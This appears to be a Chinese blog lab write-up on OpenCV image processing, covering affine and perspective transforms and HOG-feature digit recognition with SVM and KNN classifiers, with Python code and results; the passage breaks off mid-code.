<h4 id="4-图片读、写和显示操作"><a href="#4-图片读、写和显示操作" class="headerlink" title="4.图片读、写和显示操作"></a>4.图片读、写和显示操作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="comment">#读图片（有多种模式）</span></span><br><span class="line"><span class="comment"># Load an color image in grayscale</span></span><br><span class="line">img = cv.imread(‘lena.jpg’,<span class="number">0</span>) <span class="comment">#显示图片</span></span><br><span class="line">cv.imshow(‘image’,img) <span class="comment">#第一个参数定义窗口名</span></span><br><span class="line">cv.waitKey(<span class="number">0</span>) <span class="comment">#无限制的等待用户的按键</span></span><br><span class="line">cv.destroyAllWindows()</span><br><span class="line"><span class="comment">#写</span></span><br><span class="line">cv.imwrite(‘graylena.png<span class="string">',img)</span></span><br><span class="line"><span class="string">           import cv2 as cv</span></span><br><span class="line"><span class="string">img = cv.imread('</span>lena.jpg’)</span><br><span class="line"><span class="comment">#图片的相关属性</span></span><br><span class="line">print(img.shape) <span class="comment">#高度×宽度×通道数（灰度图只返回前两项）</span></span><br><span class="line">print(img.size) <span class="comment">#像素总数</span></span><br><span class="line">print(img.dtype) <span class="comment">#图像数据类型</span></span><br></pre></td></tr></table></figure>

<p><strong>结果：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(512, 512, 3)</span><br><span class="line">786432</span><br><span class="line">uint8</span><br></pre></td></tr></table></figure>



<h4 id="5-图像缩放"><a href="#5-图像缩放" class="headerlink" title="5.图像缩放"></a>5.图像缩放</h4><p><strong>cv2.resize(src, dsize, dst, fx=0, fy=0, interpolation=INTER_LINEAR )</strong> </p>
<h2 id="1-2-图像的仿射变换之图像缩放"><a href="#1-2-图像的仿射变换之图像缩放" class="headerlink" title="1.2 图像的仿射变换之图像缩放"></a>1.2 图像的仿射变换之图像缩放</h2><p><strong>仿射变换原理：</strong></p>
<p>在仿射变换中，原始图像中的所有平行线仍将在输出图像中平行。 </p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504175530141.png" alt="image-20200504175530141"></p>
<p>为了找到变换矩阵，我们需要输入图像中的三个点及其在输出图像中的相应位置。</p>
<p><strong>仿射变换矩阵：</strong></p>
<p>一个任意的仿射变换都能表示为 <em>乘以一个矩阵</em> (线性变换) 接着再 <em>加上一个向量</em> (平移).</p>
<ul>
<li>旋转 (线性变换) 、平移 (向量加) 、缩放操作 (线性变换)</li>
</ul>
<p>我们通常使用 2 x 3 矩阵来表示仿射变换.其中左边的2×2子矩阵是线性变换矩阵，右边的2×1的</p>
<p>两项是平移项：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504175115434.png" alt="image-20200504175115434"></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504175134255.png" alt="image-20200504175134255"></p>
<p>宽度方向是x，高度方向是y，坐标的顺序和图像像素对应下标一致。</p>
<p>所以原点的位置不是左下角而是左上角，y的方向也不是向上，而是向下。</p>
<p>对于图像上的<strong>任一位置(x,y)</strong>，仿射变换执行的是如下的操作：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504175150544.png" alt="image-20200504175150544"></p>
<p>使用<code>cv.getAffineTransform()</code>将创建一个2x3矩阵，将该矩阵传递给<code>cv.warpAffine()</code>得到结果。</p>
<p>仿射变换进行图像缩放，<strong>代码</strong>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="comment">#加载图片</span></span><br><span class="line">img = cv.imread(<span class="string">'lena.jpg'</span>,<span class="number">0</span>)</span><br><span class="line">rows,cols = img.shape</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据三点的横纵坐标均缩小一倍计算仿射变换</span></span><br><span class="line">pts1 = np.float32([[<span class="number">50</span>,<span class="number">50</span>],[<span class="number">200</span>,<span class="number">50</span>],[<span class="number">50</span>,<span class="number">200</span>]])</span><br><span class="line">pts2=pts1/<span class="number">2</span> <span class="comment"># np.float32([[25,25],[100,25],[25,100]])</span></span><br><span class="line"><span class="comment">#获得仿射变换矩阵</span></span><br><span class="line">M = cv.getAffineTransform(pts1,pts2)</span><br><span class="line"><span class="comment">#warpAffine长宽的一半（int）</span></span><br><span class="line">Affine_scale = cv.warpAffine(img,M,((int)(rows/<span class="number">2</span>),(int)(cols/<span class="number">2</span>)))</span><br><span class="line">cv.imshow(<span class="string">'Raw'</span>,img)</span><br><span class="line">cv.imshow(<span class="string">'Affine_scale'</span>,Affine_scale)</span><br><span class="line">cv.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>结果如下：</strong></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504173747162.png" alt="image-20200504173747162"></p>
<h2 id="1-3-图像的透视变换（空间变换）"><a href="#1-3-图像的透视变换（空间变换）" class="headerlink" title="1.3 图像的透视变换（空间变换）"></a>1.3 图像的透视变换（空间变换）</h2><p>对于透视变换，需要一个3x3变换矩阵。在转换之后，直线仍将保持笔直。</p>
<p>要找到此变换矩阵，输入图像上需要4个点，输出图像上需要相应的。在这4个点中，其中3个不应该共线。</p>
<p>通过函数<code>cv2.getPerspectiveTransform</code>找到变换矩阵，将该矩阵传递给<code>cv2.warpPerspective</code>得到结果。</p>
<p><strong>Tips</strong>：<br>仿射变换和透视变换更直观的叫法可以叫做“平面变换”和“空间变换”或者“二维坐标变换”和“三维坐标变换”。<br>从另一个角度也能说明三维变换和二维变换的意思，仿射变换的方程组有6个未知数，所以要求解就需要找到3组映射点，三个点刚好确定一个平面。透视变换的方程组有8个未知数，所以要求解就需要找到4组映射点，四个点就刚好确定了一个三维空间。</p>
<p><strong>参考资料：</strong></p>
<p><a href="https://segmentfault.com/a/1190000015645951" target="_blank" rel="noopener">opencv python 图像缩放/图像平移/图像旋转/仿射变换/透视变换</a></p>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pylab  <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">'img6.jpg'</span>)</span><br><span class="line">rows,cols,ch = img.shape</span><br><span class="line"></span><br><span class="line">pts1 = np.float32([[<span class="number">56</span>,<span class="number">65</span>],[<span class="number">368</span>,<span class="number">52</span>],[<span class="number">28</span>,<span class="number">387</span>],[<span class="number">389</span>,<span class="number">390</span>]])</span><br><span class="line">pts2 = np.float32([[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">300</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">300</span>],[<span class="number">300</span>,<span class="number">300</span>]])</span><br><span class="line"></span><br><span class="line">M = cv2.getPerspectiveTransform(pts1,pts2)</span><br><span class="line"></span><br><span class="line">dst = cv2.warpPerspective(img,M,(<span class="number">300</span>,<span class="number">300</span>))</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">121</span>),plt.imshow(img),plt.title(<span class="string">'Input'</span>)</span><br><span class="line">plt.subplot(<span class="number">122</span>),plt.imshow(dst),plt.title(<span class="string">'Output'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><strong>结果如下：</strong></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504173711245.png" alt="image-20200504173711245"></p>
<h2 id="1-4-通过HOG特征来分类——OCR"><a href="#1-4-通过HOG特征来分类——OCR" class="headerlink" title="1.4 通过HOG特征来分类——OCR"></a>1.4 通过HOG特征来分类——OCR</h2><p><strong>OCR：</strong> </p>
<p>（Optical Character Recognition，光学字符识别）是指电子设备（例如扫描仪或数码相机）检查纸上打印的字符，通过检测暗、亮的模式确定其形状，然后用字符识别方法将形状翻译成计算机文字的过程；即，对文本资料进行扫描，然后对图像文件进行分析处理，获取文字及版面信息的过程。</p>
<p><strong>一般流程如下：</strong></p>
<blockquote>
<p> 图像文件输入 → 图像特征提取 → 分类器训练 → 预测 → 识别结果输出→ 计算正确率 → …</p>
</blockquote>
<p><strong>HOG方向梯度直方图：</strong></p>
<p>（Histogram of Oriented Gradient, HOG）特征是一种在计算机视觉和图像处理中用来进行物体检测的特征描述子。它通过计算和统计图像局部区域的梯度方向直方图来构成特征。HOG特征结合SVM分类器已经被广泛应用于图像识别中，尤其在行人检测中获得了极大的成功。</p>
<p>HOG步骤如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HOG特征提取方法就是将一个image（你要检测的目标或者扫描窗口）：</span><br><span class="line"><span class="number">1</span>）灰度化（将图像看做一个x,y,z（灰度）的三维图像）；</span><br><span class="line"><span class="number">2</span>）采用Gamma校正法对输入图像进行颜色空间的标准化（归一化）；目的是调节图像的对比度，降低图像局部的阴影和光照变化所造成的影响，同时可以抑制噪音的干扰；</span><br><span class="line"><span class="number">3</span>）计算图像每个像素的梯度（包括大小和方向）；主要是为了捕获轮廓信息，同时进一步弱化光照的干扰。</span><br><span class="line"><span class="number">4</span>）将图像划分成小cells（例如<span class="number">10</span>*<span class="number">10</span>像素/cell）；</span><br><span class="line"><span class="number">5</span>）统计每个cell的梯度直方图（不同梯度的个数），即可形成每个cell的descriptor； <span class="number">6</span>）将每几个cell组成一个block（例如<span class="number">2</span>*<span class="number">2</span>个cell/block），一个block内所有cell的特征descriptor串联起来便得到该block的HOG特征descriptor。 <span class="number">7</span>）将图像image内的所有block的HOG特征descriptor串联起来就可以得到该image（你要检测的目标）的HOG特征descriptor了。这个就是最终的可供分类使用的特征向量了。</span><br></pre></td></tr></table></figure>



<p>这次实验用的是一张图的数据集（digits.png）来训练：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504180152299.png" alt="image-20200504180152299"></p>
<p>原代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SVM and KNearest digit recognition.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Sample loads a dataset of handwritten digits from '../data/digits.png'.</span></span><br><span class="line"><span class="string">Then it trains a SVM and KNearest classifiers on it and evaluates</span></span><br><span class="line"><span class="string">their accuracy.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Following preprocessing is applied to the dataset:</span></span><br><span class="line"><span class="string"> - Moment-based image deskew (see deskew())</span></span><br><span class="line"><span class="string"> - Digit images are split into 4 10x10 cells and 16-bin</span></span><br><span class="line"><span class="string">   histogram of oriented gradients is computed for each</span></span><br><span class="line"><span class="string">   cell</span></span><br><span class="line"><span class="string"> - Transform histograms to space with Hellinger metric (see [1] (RootSIFT))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[1] R. Arandjelovic, A. Zisserman</span></span><br><span class="line"><span class="string">    "Three things everyone should know to improve object retrieval"</span></span><br><span class="line"><span class="string">    http://www.robots.ox.ac.uk/~vgg/publications/2012/Arandjelovic12/arandjelovic12.pdf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">   digits.py</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 2/3 compatibility</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="comment"># built-in modules</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.linalg <span class="keyword">import</span> norm</span><br><span class="line"></span><br><span class="line"><span class="comment"># local modules</span></span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> clock, mosaic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SZ = <span class="number">20</span> <span class="comment"># size of each digit is SZ x SZ</span></span><br><span class="line">CLASS_N = <span class="number">10</span></span><br><span class="line">DIGITS_FN = <span class="string">'../data/digits.png'</span></span><br><span class="line"><span class="comment">#分割并且每张图缩放为20*20</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split2d</span><span class="params">(img, cell_size, flatten=True)</span>:</span></span><br><span class="line">    h, w = img.shape[:<span class="number">2</span>]</span><br><span class="line">    sx, sy = cell_size</span><br><span class="line">    cells = [np.hsplit(row, w//sx) <span class="keyword">for</span> row <span class="keyword">in</span> np.vsplit(img, h//sy)]</span><br><span class="line">    cells = np.array(cells)</span><br><span class="line">    <span class="keyword">if</span> flatten:</span><br><span class="line">        cells = cells.reshape(<span class="number">-1</span>, sy, sx)</span><br><span class="line">    <span class="keyword">return</span> cells</span><br><span class="line"><span class="comment">#加载digits数据集</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_digits</span><span class="params">(fn)</span>:</span></span><br><span class="line">    print(<span class="string">'loading "%s" ...'</span> % fn)</span><br><span class="line">    digits_img = cv.imread(fn, <span class="number">0</span>)</span><br><span class="line">    digits = split2d(digits_img, (SZ, SZ))</span><br><span class="line">    labels = np.repeat(np.arange(CLASS_N), len(digits)/CLASS_N)</span><br><span class="line">    <span class="keyword">return</span> digits, labels</span><br><span class="line"><span class="comment">#纠正图片倾斜</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deskew</span><span class="params">(img)</span>:</span></span><br><span class="line">    m = cv.moments(img)</span><br><span class="line">    <span class="keyword">if</span> abs(m[<span class="string">'mu02'</span>]) &lt; <span class="number">1e-2</span>:</span><br><span class="line">        <span class="keyword">return</span> img.copy()</span><br><span class="line">    skew = m[<span class="string">'mu11'</span>]/m[<span class="string">'mu02'</span>]</span><br><span class="line">    M = np.float32([[<span class="number">1</span>, skew, <span class="number">-0.5</span>*SZ*skew], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]])</span><br><span class="line">    img = cv.warpAffine(img, M, (SZ, SZ), flags=cv.WARP_INVERSE_MAP | cv.INTER_LINEAR)</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"><span class="comment">#模型的加载和保存</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StatModel</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self, fn)</span>:</span></span><br><span class="line">        self.model.load(fn)  <span class="comment"># Known bug: https://github.com/opencv/opencv/issues/4969</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, fn)</span>:</span></span><br><span class="line">        self.model.save(fn)</span><br><span class="line"><span class="comment">#knn分类器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KNearest</span><span class="params">(StatModel)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, k = <span class="number">3</span>)</span>:</span></span><br><span class="line">        self.k = k</span><br><span class="line">        self.model = cv.ml.KNearest_create()</span><br><span class="line">    <span class="comment">#训练</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(self, samples, responses)</span>:</span></span><br><span class="line">        self.model.train(samples, cv.ml.ROW_SAMPLE, responses)</span><br><span class="line">    <span class="comment">#评估</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(self, samples)</span>:</span></span><br><span class="line">        _retval, results, _neigh_resp, _dists = self.model.findNearest(samples, self.k)</span><br><span class="line">        <span class="keyword">return</span> results.ravel()</span><br><span class="line"><span class="comment">#SVM分类器训练</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SVM</span><span class="params">(StatModel)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, C = <span class="number">1</span>, gamma = <span class="number">0.5</span>)</span>:</span></span><br><span class="line">        self.model = cv.ml.SVM_create()</span><br><span class="line">        self.model.setGamma(gamma)</span><br><span class="line">        self.model.setC(C)</span><br><span class="line">        self.model.setKernel(cv.ml.SVM_RBF)</span><br><span class="line">        self.model.setType(cv.ml.SVM_C_SVC)</span><br><span class="line">    <span class="comment">#训练</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(self, samples, responses)</span>:</span></span><br><span class="line">        self.model.train(samples, cv.ml.ROW_SAMPLE, responses)</span><br><span class="line">    <span class="comment">#评估</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(self, samples)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.model.predict(samples)[<span class="number">1</span>].ravel()</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试集评估模型</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate_model</span><span class="params">(model, digits, samples, labels)</span>:</span></span><br><span class="line">    resp = model.predict(samples)</span><br><span class="line">    err = (labels != resp).mean()</span><br><span class="line">    print(<span class="string">'error: %.2f %%'</span> % (err*<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">    confusion = np.zeros((<span class="number">10</span>, <span class="number">10</span>), np.int32)</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(labels, resp):</span><br><span class="line">        confusion[i, int(j)] += <span class="number">1</span></span><br><span class="line">    print(<span class="string">'confusion matrix:'</span>)</span><br><span class="line">    print(confusion)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    vis = []</span><br><span class="line">    <span class="keyword">for</span> img, flag <span class="keyword">in</span> zip(digits, resp == labels):</span><br><span class="line">        img = cv.cvtColor(img, cv.COLOR_GRAY2BGR)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            img[...,:<span class="number">2</span>] = <span class="number">0</span></span><br><span class="line">        vis.append(img)</span><br><span class="line">    <span class="keyword">return</span> mosaic(<span class="number">25</span>, vis)</span><br><span class="line"><span class="comment">#简单预处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_simple</span><span class="params">(digits)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> np.float32(digits).reshape(<span class="number">-1</span>, SZ*SZ) / <span class="number">255.0</span></span><br><span class="line"><span class="comment">#hog特征计算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_hog</span><span class="params">(digits)</span>:</span></span><br><span class="line">    samples = []</span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> digits:</span><br><span class="line">        gx = cv.Sobel(img, cv.CV_32F, <span class="number">1</span>, <span class="number">0</span>)  <span class="comment">#sobel算子边缘检测 一阶差分滤波器</span></span><br><span class="line">        gy = cv.Sobel(img, cv.CV_32F, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        mag, ang = cv.cartToPolar(gx, gy)  <span class="comment">#极坐标变换 （模 角度）</span></span><br><span class="line">        bin_n = <span class="number">16</span>  <span class="comment">#区间数</span></span><br><span class="line">        bin = np.int32(bin_n*ang/(<span class="number">2</span>*np.pi))</span><br><span class="line">        bin_cells = bin[:<span class="number">10</span>,:<span class="number">10</span>], bin[<span class="number">10</span>:,:<span class="number">10</span>], bin[:<span class="number">10</span>,<span class="number">10</span>:], bin[<span class="number">10</span>:,<span class="number">10</span>:]</span><br><span class="line">        mag_cells = mag[:<span class="number">10</span>,:<span class="number">10</span>], mag[<span class="number">10</span>:,:<span class="number">10</span>], mag[:<span class="number">10</span>,<span class="number">10</span>:], mag[<span class="number">10</span>:,<span class="number">10</span>:]</span><br><span class="line">        hists = [np.bincount(b.ravel(), m.ravel(), bin_n) <span class="keyword">for</span> b, m <span class="keyword">in</span> zip(bin_cells, mag_cells)]    <span class="comment">#统计梯度直方图</span></span><br><span class="line">        hist = np.hstack(hists)</span><br><span class="line">        <span class="comment"># transform to Hellinger kernel  to quantify the similarity of two probability distributions</span></span><br><span class="line">        eps = <span class="number">1e-7</span></span><br><span class="line">        hist /= hist.sum() + eps</span><br><span class="line">        hist = np.sqrt(hist)</span><br><span class="line">        hist /= norm(hist) + eps</span><br><span class="line"></span><br><span class="line">        samples.append(hist)</span><br><span class="line">    <span class="keyword">return</span> np.float32(samples)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(__doc__)</span><br><span class="line"></span><br><span class="line">    digits, labels = load_digits(DIGITS_FN) <span class="comment">#图像切分 导入</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'preprocessing...'</span>)</span><br><span class="line">    <span class="comment"># shuffle digits</span></span><br><span class="line">    rand = np.random.RandomState(<span class="number">321</span>)   <span class="comment">#随机种子321</span></span><br><span class="line">    shuffle = rand.permutation(len(digits))</span><br><span class="line">    digits, labels = digits[shuffle], labels[shuffle]   <span class="comment">#打乱数字顺序</span></span><br><span class="line"></span><br><span class="line">    digits2 = list(map(deskew, digits)) <span class="comment">#纠正图片倾斜</span></span><br><span class="line">    samples = preprocess_hog(digits2)   <span class="comment">#计算hog特征</span></span><br><span class="line"></span><br><span class="line">    train_n = int(<span class="number">0.9</span>*len(samples)) <span class="comment">#划分训练测试集</span></span><br><span class="line">    print(train_n)</span><br><span class="line">    cv.imshow(<span class="string">'test set'</span>, mosaic(<span class="number">25</span>, digits[train_n:]))<span class="comment">#展示划分出来的测试数据集</span></span><br><span class="line">    digits_train, digits_test = np.split(digits2, [train_n])<span class="comment">#图像数据</span></span><br><span class="line">    samples_train, samples_test = np.split(samples, [train_n])<span class="comment">#特征数据</span></span><br><span class="line">    labels_train, labels_test = np.split(labels, [train_n])<span class="comment">#标签分割</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'training KNearest...'</span>)   <span class="comment">#knn分类器</span></span><br><span class="line">    model = KNearest(k=<span class="number">4</span>)</span><br><span class="line">    model.train(samples_train, labels_train)</span><br><span class="line">    vis = evaluate_model(model, digits_test, samples_test, labels_test)</span><br><span class="line">    cv.imshow(<span class="string">'KNearest test'</span>, vis)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'training SVM...'</span>)    <span class="comment">#SVM分类器</span></span><br><span class="line">    model = SVM(C=<span class="number">2.67</span>, gamma=<span class="number">5.383</span>)</span><br><span class="line">    model.train(samples_train, labels_train)</span><br><span class="line">    vis = evaluate_model(model, digits_test, samples_test, labels_test)</span><br><span class="line">    cv.imshow(<span class="string">'SVM test'</span>, vis)</span><br><span class="line">    print(<span class="string">'saving SVM as "digits_svm.dat"...'</span>)</span><br><span class="line">    model.save(<span class="string">'digits_svm.dat'</span>)</span><br><span class="line"></span><br><span class="line">    cv.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>训练结果如下：</strong></p>
<p>其中，白色的数字为分类识别成功，红色的为识别错误</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504181130518.png" alt="image-20200504181130518"></p>
<h2 id="1-5-HOG特征，自找数据集进行测试"><a href="#1-5-HOG特征，自找数据集进行测试" class="headerlink" title="1.5 HOG特征，自找数据集进行测试"></a>1.5 HOG特征，自找数据集进行测试</h2><p>这里我选择了<code>mnist</code>的图、以及word做的一些图混合来进行测试：</p>
<p><code>mnist</code>的图像大小都是<code>28 * 28</code>，word做的也不是<code>20*20</code>，我们用仿射变换来进行缩小为 <code>20 * 20</code></p>
<p>数据集，每一种数字有6个，总共有6 * 10=60张图：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504192849951.png" alt="image-20200504192849951"></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504191505663.png" alt="image-20200504191505663"></p>
<p>其中有个复杂的点，数据结构的问题：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># resp = model.predict(samples)</span></span><br><span class="line"><span class="comment">#这里加个[1].flatten()是因为读出的模型predict的datatype要转化为nparray</span></span><br><span class="line">resp=model.predict(samples)[<span class="number">1</span>].flatten()</span><br></pre></td></tr></table></figure>



<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.linalg <span class="keyword">import</span> norm</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> clock, mosaic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SZ = <span class="number">20</span> <span class="comment"># size of each digit is SZ x SZ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 纠正图像倾斜</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deskew</span><span class="params">(img)</span>:</span></span><br><span class="line">    m = cv.moments(img)</span><br><span class="line">    <span class="keyword">if</span> abs(m[<span class="string">'mu02'</span>]) &lt; <span class="number">1e-2</span>:</span><br><span class="line">        <span class="keyword">return</span> img.copy()</span><br><span class="line">    skew = m[<span class="string">'mu11'</span>]/m[<span class="string">'mu02'</span>]</span><br><span class="line">    M = np.float32([[<span class="number">1</span>, skew, <span class="number">-0.5</span>*SZ*skew], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]])</span><br><span class="line">    img = cv.warpAffine(img, M, (SZ, SZ), flags=cv.WARP_INVERSE_MAP | cv.INTER_LINEAR)</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="comment">#hog特征计算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_hog</span><span class="params">(digits)</span>:</span></span><br><span class="line">    samples = []</span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> digits:</span><br><span class="line">        gx = cv.Sobel(img, cv.CV_32F, <span class="number">1</span>, <span class="number">0</span>)  <span class="comment">#sobel算子 边缘检测 一阶差分滤波器</span></span><br><span class="line">        gy = cv.Sobel(img, cv.CV_32F, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        mag, ang = cv.cartToPolar(gx, gy)  <span class="comment">#极坐标变换 （模 角度）</span></span><br><span class="line">        bin_n = <span class="number">16</span>  <span class="comment">#区间数</span></span><br><span class="line">        bin = np.int32(bin_n*ang/(<span class="number">2</span>*np.pi))</span><br><span class="line">        bin_cells = bin[:<span class="number">10</span>,:<span class="number">10</span>], bin[<span class="number">10</span>:,:<span class="number">10</span>], bin[:<span class="number">10</span>,<span class="number">10</span>:], bin[<span class="number">10</span>:,<span class="number">10</span>:]</span><br><span class="line">        mag_cells = mag[:<span class="number">10</span>,:<span class="number">10</span>], mag[<span class="number">10</span>:,:<span class="number">10</span>], mag[:<span class="number">10</span>,<span class="number">10</span>:], mag[<span class="number">10</span>:,<span class="number">10</span>:]</span><br><span class="line">        hists = [np.bincount(b.ravel(), m.ravel(), bin_n) <span class="keyword">for</span> b, m <span class="keyword">in</span> zip(bin_cells, mag_cells)]    <span class="comment">#统计梯度直方图</span></span><br><span class="line">        hist = np.hstack(hists)</span><br><span class="line">        <span class="comment"># transform to Hellinger kernel  to quantify the similarity of two probability distributions</span></span><br><span class="line">        eps = <span class="number">1e-7</span></span><br><span class="line">        hist /= hist.sum() + eps</span><br><span class="line">        hist = np.sqrt(hist)</span><br><span class="line">        hist /= norm(hist) + eps</span><br><span class="line"></span><br><span class="line">        samples.append(hist)</span><br><span class="line">    <span class="keyword">return</span> np.float32(samples)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#评估函数，基本没改</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate_model_2</span><span class="params">(model, digits, samples, labels)</span>:</span></span><br><span class="line">    <span class="comment"># resp = model.predict(samples)</span></span><br><span class="line">    <span class="comment">#这里加个[1].flatten()是因为读出的模型predict的datatype要转化为nparray</span></span><br><span class="line">    resp=model.predict(samples)[<span class="number">1</span>].flatten()</span><br><span class="line">    print(labels)</span><br><span class="line">    print(resp)</span><br><span class="line">    err = (labels != resp).mean()</span><br><span class="line">    print(<span class="string">'error: %.2f %%'</span> % (err*<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">    confusion = np.zeros((<span class="number">10</span>, <span class="number">10</span>), np.int32)</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(labels, resp):</span><br><span class="line">        confusion[i, int(j)] += <span class="number">1</span></span><br><span class="line">    print(<span class="string">'confusion matrix:'</span>)</span><br><span class="line">    print(confusion)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    vis = []</span><br><span class="line">    <span class="keyword">for</span> img, flag <span class="keyword">in</span> zip(digits, resp == labels):</span><br><span class="line">        img = cv.cvtColor(img, cv.COLOR_GRAY2BGR) <span class="comment">#RGB显示？</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            img[...,:<span class="number">2</span>] = <span class="number">0</span> <span class="comment">#变红</span></span><br><span class="line">        vis.append(img)</span><br><span class="line">        <span class="comment"># 以25为一行</span></span><br><span class="line">    <span 